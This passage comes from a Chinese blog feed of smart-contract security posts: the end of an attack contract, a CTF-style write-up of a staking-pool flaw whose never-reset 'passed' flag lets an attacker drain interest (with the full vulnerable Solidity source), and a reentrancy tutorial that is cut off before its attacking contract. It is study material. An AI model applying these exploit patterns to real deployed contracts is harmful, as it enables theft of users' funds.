class="line">        address(defuse).call(abi.encodeWithSignature(&quot;setCountDownTimer(uint256)&quot;,</span><br><span class="line">        0x000000000000000000000085A33A74098A4Fc235c4225417745805129e16b100,</span><br><span class="line">        0x50ff0f52db8fd58abf094db7ef8e56acd1e5250dcb9dbd6e5a5b3f2b67d00e3a));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract attackLauncher&#123;</span><br><span class="line">    bool public Explode = false;</span><br><span class="line">    address public launcherAddress;</span><br><span class="line">    bytes32 private password;</span><br><span class="line">    bool public powerState = true;</span><br><span class="line">    uint public deadline;</span><br><span class="line">    </span><br><span class="line">constructor()public &#123;</span><br><span class="line">        deadline = block.number + 100000;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function changedeadline(uint256 _deadline) public &#123;</span><br><span class="line">        powerState = false;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="全过程"><a href="#全过程" class="headerlink" title="全过程"></a>全过程</h2><p><img src="https://moe.photo/images/2023/05/21/nc.jpg" alt></p><p><img src="https://moe.photo/images/2023/05/21/1.png" alt></p><p><img src="https://moe.photo/images/2023/05/21/2.png" alt></p><p><img src="https://moe.photo/images/2023/05/21/3.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>02.stake漏洞</title>
      <link href="/2023/06/23/00.security/02.stakeA%CC%82I%CC%87h%CC%82%C2%B4/02.stakeA%CC%82I%CC%87h%CC%82%C2%B4/"/>
      <url>/2023/06/23/00.security/02.stakeA%CC%82I%CC%87h%CC%82%C2%B4/02.stakeA%CC%82I%CC%87h%CC%82%C2%B4/</url>
      
        <content type="html"><![CDATA[<h1 id="改正"><a href="#改正" class="headerlink" title="改正"></a>改正</h1><h2 id="stake漏洞"><a href="#stake漏洞" class="headerlink" title="stake漏洞"></a>stake漏洞</h2><p>任务描述：将setup.sol中的complete方法返回true，分析一下，实质就是让我在erc20合约中的余额要大于500000ETH。</p><p>这个代码描述的业务是：有一个合约A(ztstakepool)，每操作一次stake，可以传入一个参数blocknumber(这个合约A提供给你的利息，因为你把钱存到它这里)，当blocknumber达到规定的数量后(当前区块达到blocknumber)，才可以调用swap方法，将利息转出去。它希望我们执行完1，2，3步骤之后，合约只能让我们从新从1开始循环。合约A希望的正常交易流程如下：</p><p><img src="/2023/06/23/00.security/02.stakeA%CC%82I%CC%87h%CC%82%C2%B4/02.stakeA%CC%82I%CC%87h%CC%82%C2%B4/正常项目流程.jpg" alt></p><p>但是，合约A写的合约有问题，我们可以直接获取任意数额的利息！</p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>我们想要获取利息，那么就必须要调用swap方法。我们分析这个代码发现，第一个require是确定转账地址，第二个require是不可以提取的利息大于利息本身，最重要的是要调用workBalanceOf这个方法，来获取利息的数量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function swap(address from,address to,uint amount)external&#123;</span><br><span class="line">        require(from==address(this)&amp;&amp;to==address(token));</span><br><span class="line">        uint balance = workBalanceOf(msg.sender);</span><br><span class="line">        require(balance&gt;=amount,&quot;exceed&quot;);</span><br><span class="line">        workbalance[msg.sender] -= amount;</span><br><span class="line">        token.transfer(msg.sender,amount*10**18);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>但是workBalanceOf这个方法需要pass为true才行，也就是unstake之后才可以调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function workBalanceOf(address account)public view returns(uint)&#123;</span><br><span class="line">        bool pass=passed[account];</span><br><span class="line">        if(pass)&#123;</span><br><span class="line">            return workbalance[account];</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们查看unstake方法（也就是问题出现的地方）：调用这个方法唯一的要求是<code>block.number&gt;=user.startTime+user.duration</code>，我们满足了这个条件就可以取出利息了！但是stake，unstake，swap之间存在逻辑问题</p><p>黑客说：因为unstake的唯一要求是<code>block.number&gt;=user.startTime+user.duration</code>，那么我们可以创建一个账户，存0元，利息设置为1(blocknumber)。因为只有一个区块的要求，那么该区块链很快就会达到这个要求，将pass设置为true。这时候我们再次存款0元，利息设置为任何值，都可以调用swap方法，因为pass已经变为true了，可以调用workBalanceOf方法，直接取出利息！</p><p><strong>因此问题就出在：我们取出利息，将pass设置为true，就一直是true，没有任何一种机制将他设置为false。</strong></p><p><strong>解决方案：在每次stake之前将pass设置为false，这里不做展示。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function unstake()external&#123;</span><br><span class="line">        userInfo storage user = userDetails[msg.sender];</span><br><span class="line">        require(block.number&gt;=user.startTime+user.duration,&quot;you are in a hurry &quot;);</span><br><span class="line">        passed[msg.sender] = true;</span><br><span class="line">        uint amount = user.amount;</span><br><span class="line">        user.amount = 0;</span><br><span class="line">        token.transfer(msg.sender,amount*10**18);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h2><p><img src="/2023/06/23/00.security/02.stakeA%CC%82I%CC%87h%CC%82%C2%B4/02.stakeA%CC%82I%CC%87h%CC%82%C2%B4/改正_1.png" alt></p><p><img src="/2023/06/23/00.security/02.stakeA%CC%82I%CC%87h%CC%82%C2%B4/02.stakeA%CC%82I%CC%87h%CC%82%C2%B4/改正_2.png" alt></p><p>调用unstake成功，如下图：</p><p><img src="/2023/06/23/00.security/02.stakeA%CC%82I%CC%87h%CC%82%C2%B4/02.stakeA%CC%82I%CC%87h%CC%82%C2%B4/改正_3.png" alt="调用unstake成功"></p><p><img src="/2023/06/23/00.security/02.stakeA%CC%82I%CC%87h%CC%82%C2%B4/02.stakeA%CC%82I%CC%87h%CC%82%C2%B4/改正_4.png" alt></p><p><img src="/2023/06/23/00.security/02.stakeA%CC%82I%CC%87h%CC%82%C2%B4/02.stakeA%CC%82I%CC%87h%CC%82%C2%B4/改正_5.png" alt></p><p>调用swap，拿出利息</p><p><img src="/2023/06/23/00.security/02.stakeA%CC%82I%CC%87h%CC%82%C2%B4/02.stakeA%CC%82I%CC%87h%CC%82%C2%B4/改正_6.png" alt></p><p>我们真的盗取了500000ETH利息！</p><p><img src="/2023/06/23/00.security/02.stakeA%CC%82I%CC%87h%CC%82%C2%B4/02.stakeA%CC%82I%CC%87h%CC%82%C2%B4/改正_7.png" alt></p><p>isSolved方法返回true，题目做完了</p><p><img src="/2023/06/23/00.security/02.stakeA%CC%82I%CC%87h%CC%82%C2%B4/02.stakeA%CC%82I%CC%87h%CC%82%C2%B4/改正_8.png" alt></p><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.12;</span><br><span class="line">pragma experimental ABIEncoderV2;</span><br><span class="line"></span><br><span class="line">library SafeMath &#123;</span><br><span class="line">    function add(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">        uint256 c = a + b;</span><br><span class="line">        require(c &gt;= a, &quot;SafeMath: addition overflow&quot;);</span><br><span class="line"></span><br><span class="line">        return c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sub(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">        require(b &lt;= a, &quot;SafeMath: subtraction overflow&quot;);</span><br><span class="line">        uint256 c = a - b;</span><br><span class="line"></span><br><span class="line">        return c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mul(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">        if (a == 0) &#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        uint256 c = a * b;</span><br><span class="line">        require(c / a == b, &quot;SafeMath: multiplication overflow&quot;);</span><br><span class="line"></span><br><span class="line">        return c;</span><br><span class="line">    &#125;</span><br><span class="line">    function div(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">        require(b &gt; 0, &quot;SafeMath: division by zero&quot;);</span><br><span class="line">        uint256 c = a / b;</span><br><span class="line"></span><br><span class="line">        return c;</span><br><span class="line">    &#125;</span><br><span class="line">    function mod(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">        require(b != 0, &quot;SafeMath: modulo by zero&quot;);</span><br><span class="line">        return a % b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ERC20 &#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">    mapping (address =&gt; uint256) public _balances;</span><br><span class="line"></span><br><span class="line">    mapping (address =&gt; mapping (address =&gt; uint256)) public _allowances;</span><br><span class="line"></span><br><span class="line">    string public _name;</span><br><span class="line">    string public _symbol;</span><br><span class="line">    uint8 public _decimals;</span><br><span class="line"></span><br><span class="line">    constructor (string memory name, string memory symbol) public &#123;</span><br><span class="line">        _name = name;</span><br><span class="line">        _symbol = symbol;</span><br><span class="line">        _decimals = 18;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address account) public view returns (uint256) &#123;</span><br><span class="line">        return _balances[account];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address recipient, uint256 amount) public virtual returns (bool) &#123;</span><br><span class="line">        _transfer(msg.sender, recipient, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 amount) public virtual returns (bool) &#123;</span><br><span class="line">        _approve(msg.sender, spender, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) &#123;</span><br><span class="line">        _transfer(sender, recipient, amount);</span><br><span class="line">        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _transfer(address sender, address recipient, uint256 amount) internal virtual &#123;</span><br><span class="line">        require(sender != address(0), &quot;ERC20: transfer from the zero address&quot;);</span><br><span class="line">        require(recipient != address(0), &quot;ERC20: transfer to the zero address&quot;);</span><br><span class="line"></span><br><span class="line">        _balances[sender] = _balances[sender].sub(amount);</span><br><span class="line">        _balances[recipient] = _balances[recipient].add(amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _mint(address account, uint256 amount) internal virtual &#123;</span><br><span class="line">        require(account != address(0), &quot;ERC20: mint to the zero address&quot;);</span><br><span class="line">        _balances[account] = _balances[account].add(amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _burn(address account, uint256 amount) internal virtual &#123;</span><br><span class="line">        require(account != address(0), &quot;ERC20: burn from the zero address&quot;);</span><br><span class="line">        _balances[account] = _balances[account].sub(amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _approve(address owner, address spender, uint256 amount) internal virtual &#123;</span><br><span class="line">        require(owner != address(0), &quot;ERC20: approve from the zero address&quot;);</span><br><span class="line">        require(spender != address(0), &quot;ERC20: approve to the zero address&quot;);</span><br><span class="line">        _allowances[owner][spender] = amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ZT is ERC20(&quot;ZERO TOKEN&quot;, &quot;ZT&quot;)&#123;</span><br><span class="line">    //RULE 1</span><br><span class="line">    bytes32 constant RULE_WITHDRAW_WANT = keccak256(abi.encodePacked(&quot;withdraw&quot;));</span><br><span class="line"></span><br><span class="line">    //RULE 2</span><br><span class="line">    bytes32 constant RULE_NONE_WANT = keccak256(abi.encodePacked(&quot;depositByValue&quot;));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    constructor()public&#123;</span><br><span class="line">        _mint(msg.sender,10000000*10**18);</span><br><span class="line">    &#125;</span><br><span class="line">    function depositByWant(uint _amount)external payable&#123;</span><br><span class="line">        uint amount = _amount.mul(10**18);</span><br><span class="line">        require(msg.value&gt;=amount,&quot;you want to trick me?&quot;);</span><br><span class="line">        MkaheChange(msg.sender,amount,RULE_NONE_WANT);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint _amount)external payable returns(bool)&#123;</span><br><span class="line">        uint amount = _amount.mul(10**18);</span><br><span class="line">        require(balanceOf(msg.sender)&gt;=amount);</span><br><span class="line">        _balances[msg.sender] = _balances[msg.sender].sub(amount);</span><br><span class="line">        return MkaheChange(msg.sender,amount,RULE_WITHDRAW_WANT);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function MkaheChange(address to,uint amount,bytes32 ID)internal returns(bool)&#123;</span><br><span class="line">        if(ID==RULE_NONE_WANT)</span><br><span class="line">        &#123;</span><br><span class="line">            _balances[msg.sender]=_balances[msg.sender].add(amount);</span><br><span class="line">            return true;</span><br><span class="line">        &#125;else if(ID==RULE_WITHDRAW_WANT)&#123;</span><br><span class="line">            bool a;</span><br><span class="line">            (a,)=payable(to).call.value(amount)(&quot;&quot;);</span><br><span class="line">            require(a,&quot;withdraw fail&quot;);</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback()external payable&#123;</span><br><span class="line">        MkaheChange(</span><br><span class="line">            msg.sender,</span><br><span class="line">            msg.value,</span><br><span class="line">            RULE_NONE_WANT</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ZTstakepool&#123;</span><br><span class="line">    ZT token;</span><br><span class="line">    uint  totalsupply;</span><br><span class="line">    string symbol;</span><br><span class="line">    mapping(address=&gt;uint)internal workbalance;</span><br><span class="line">    mapping(address=&gt;bool)internal passed;</span><br><span class="line"></span><br><span class="line">    struct userInfo&#123;</span><br><span class="line">        uint amount;</span><br><span class="line">        uint duration;</span><br><span class="line">        uint startTime;</span><br><span class="line">    &#125;</span><br><span class="line">    mapping(address=&gt;userInfo)internal userDetails;</span><br><span class="line"></span><br><span class="line">    constructor()public&#123;</span><br><span class="line">        token =new ZT();</span><br><span class="line">        symbol = &quot;stTGT&quot;;</span><br><span class="line">        totalsupply = token.balanceOf(address(this));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getDetails(address account)public view returns(userInfo memory)&#123;</span><br><span class="line">        return userDetails[account];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function workBalanceOf(address account)public view returns(uint)&#123;</span><br><span class="line">        bool pass=passed[account];</span><br><span class="line">        if(pass)&#123;</span><br><span class="line">            return workbalance[account];</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function Zt()public view returns(address)&#123;</span><br><span class="line">        return address(token);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function stake(uint amount,uint blocknumber)external&#123;</span><br><span class="line">        require(blocknumber&gt;=1,&quot;At least 1 block&quot;);</span><br><span class="line"></span><br><span class="line">        userInfo storage user = userDetails[msg.sender];</span><br><span class="line"></span><br><span class="line">        user.startTime = block.number;</span><br><span class="line">        user.duration = blocknumber;</span><br><span class="line">        user.amount += amount;</span><br><span class="line"></span><br><span class="line">        token.transferFrom(msg.sender,address(this),amount*10**18);</span><br><span class="line">        workbalance[msg.sender] += blocknumber;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function unstake()external&#123;</span><br><span class="line">        userInfo storage user = userDetails[msg.sender];</span><br><span class="line">        require(block.number&gt;=user.startTime+user.duration,&quot;you are in a hurry &quot;);</span><br><span class="line">        passed[msg.sender] = true;</span><br><span class="line">        uint amount = user.amount;</span><br><span class="line">        user.amount = 0;</span><br><span class="line">        token.transfer(msg.sender,amount*10**18);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function swap(address from,address to,uint amount)external&#123;</span><br><span class="line">        require(from==address(this)&amp;&amp;to==address(token));</span><br><span class="line">        uint balance = workBalanceOf(msg.sender);</span><br><span class="line">        require(balance&gt;=amount,&quot;exceed&quot;);</span><br><span class="line">        workbalance[msg.sender] -= amount;</span><br><span class="line">        token.transfer(msg.sender,amount*10**18);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract setup&#123;</span><br><span class="line">    ZTstakepool public stakePool;</span><br><span class="line">    ZT public erc20;</span><br><span class="line">    bool solve;</span><br><span class="line">    constructor()public&#123;</span><br><span class="line">        stakePool =new ZTstakepool();</span><br><span class="line">        erc20 = ZT(payable(stakePool.Zt()));</span><br><span class="line">    &#125;</span><br><span class="line">    function isSolved()public view returns(bool)&#123;</span><br><span class="line">        return solve;</span><br><span class="line">    &#125;</span><br><span class="line">    function complete()public&#123;</span><br><span class="line">        require(erc20.balanceOf(msg.sender)&gt;=500000*10**18);</span><br><span class="line">        solve = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>01.重入攻击_1</title>
      <link href="/2023/06/23/00.security/01.%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB_1/01.%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB_1/"/>
      <url>/2023/06/23/00.security/01.%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB_1/01.%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB_1/</url>
      
        <content type="html"><![CDATA[<h1 id="重入攻击"><a href="#重入攻击" class="headerlink" title="重入攻击"></a>重入攻击</h1><p>重入攻击叫做：Reentrancy attack或者replay attack。顾名思义，就是再次进入、再次执行的攻击。</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>solidity文档对重入的解释：任何从合约 A 到合约 B 的交互、任何从合约 A 到合约 B 的以太币转移，都会将控制权交给合约 B。 这使得合约 B 能够在交互结束前回调 A 中的代码。</p><p>简单来说，就是重复地调用同一个方法，达到一个目的：黑客利用自己攻击合约中的回调函数、多余的gas将合约中本不属于自己的 ETH 转走。</p><p>注意：一般情况下是用Fallback函数进行重入，其实receive函数也可以进行重入。后面的两个例子，分别尝试了这两个情况</p><p><img src="https://moe.photo/images/2023/02/22/02c04931d3300d797c66e48e495d478b.png" alt></p><h2 id="发生重入攻击的条件"><a href="#发生重入攻击的条件" class="headerlink" title="发生重入攻击的条件"></a>发生重入攻击的条件</h2><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul><li>调用了外部的合约且该合约是不安全的</li><li>外部合约的函数调用早于状态变量的修改</li></ul><h3 id="Fallback回调函数"><a href="#Fallback回调函数" class="headerlink" title="Fallback回调函数"></a>Fallback回调函数</h3><p>声明方式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fallback () external [payable]&#123;&#125;</span><br><span class="line">//或</span><br><span class="line">fallback (bytes calldata input) external [payable] returns (bytes memory output)&#123;&#125;</span><br></pre></td></tr></table></figure><p> 功能：</p><ul><li>当合约中没有任何匹配的函数可调用时，调用fallback()函数。</li><li><strong>可用于接收ETH，接收之后就调用fallback函数，即调用（call, send, transfer）没有带任何数据时被自动调用。</strong></li><li>可以用于代理合约<code>proxy contract</code>。如果别人用<code>send</code>和<code>transfer</code>方法发送<code>ETH</code>的话，<code>gas</code>会限制在<code>2300</code></li></ul><p>特点：</p><ul><li>一个合约至多含有一个fallback()函数</li><li>没有function关键字</li><li><strong>payable关键字是可选项，取决于该函数是否需要接收以太币</strong></li><li>该函数可代替receive()函数以实现合约接受转发以太币的功能</li><li>可见性必须声明为external</li><li>允许使用modifier修改器</li><li>在gasLimit允许范围内可执行复杂操作</li></ul><h3 id="发送交易"><a href="#发送交易" class="headerlink" title="发送交易"></a>发送交易</h3><p><strong>transfer</strong></p><ul><li>用法：<code>接收方地址.transfer(发送ETH数额)</code>。</li><li><strong><code>transfer()</code>的<code>gas</code>限制是<code>2300</code>，足够用于转账，但对方合约的<code>fallback()</code>或<code>receive()</code>函数不能实现太复杂的逻辑。防止了重入攻击</strong></li><li><code>transfer()</code>如果转账失败，会自动<code>revert</code>（回滚交易）。</li></ul><p><strong>send</strong></p><ul><li>用法：<code>接收方地址.send(发送ETH数额)</code>。</li><li><strong><code>send()</code>的<code>gas</code>限制是<code>2300</code>，足够用于转账，但对方合约的<code>fallback()</code>或<code>receive()</code>函数不能实现太复杂的逻辑。防止了重入攻击</strong></li><li><code>send()</code>如果转账失败，不会<code>revert</code>。</li><li><code>send()</code>的返回值是<code>bool</code>，代表着转账成功或失败，需要额外代码处理一下。</li></ul><p><strong>call</strong></p><ul><li>用法：<code>接收方地址.call&#123;value: 发送ETH数额&#125;(&quot;&quot;)</code>。</li><li><strong><code>call()</code>没有<code>gas</code>限制，可以支持对方合约<code>fallback()</code>或<code>receive()</code>函数实现复杂逻辑。存在重入攻击的可能性</strong></li><li><code>call()</code>如果转账失败，不会<code>revert</code>。</li><li><code>call()</code>的返回值是<code>(bool, data)</code>，其中<code>bool</code>代表着转账成功或失败，需要额外代码处理一下。</li></ul><h2 id="例子复现"><a href="#例子复现" class="headerlink" title="例子复现"></a>例子复现</h2><p>被攻击的合约：针对这个合约，攻击者可以不执行 <code>balances[msg.sender] -= _weiToWithdraw;</code>，利用 fallback 函数在攻击合约中将所有ETH转走。</p><p>攻击过程请按数字步骤进行浏览</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// 假设每个人可以像合约里存储 ETH，每次取款至少为 1 ETH。</span><br><span class="line">contract EtherStore &#123;</span><br><span class="line"></span><br><span class="line">    uint256 public withdrawalLimit = 1 ether;//一次至少取款1ETH</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function depositFunds() public payable &#123;//存钱</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdrawFunds (uint256 _weiToWithdraw) public &#123;</span><br><span class="line">    // 5. 因为攻击者的 balance 值没有变化，所以继续执行2.</span><br><span class="line">        require(balances[msg.sender] &gt;= _weiToWithdraw);//够钱才可以取出</span><br><span class="line">        require(_weiToWithdraw &lt;= withdrawalLimit);//至少取1ETH</span><br><span class="line">        </span><br><span class="line">        // 2. 转钱</span><br><span class="line">        require(msg.sender.call.value(_weiToWithdraw)());</span><br><span class="line">        // 这行代码不会被执行</span><br><span class="line">        balances[msg.sender] -= _weiToWithdraw;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>发起攻击的合约：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 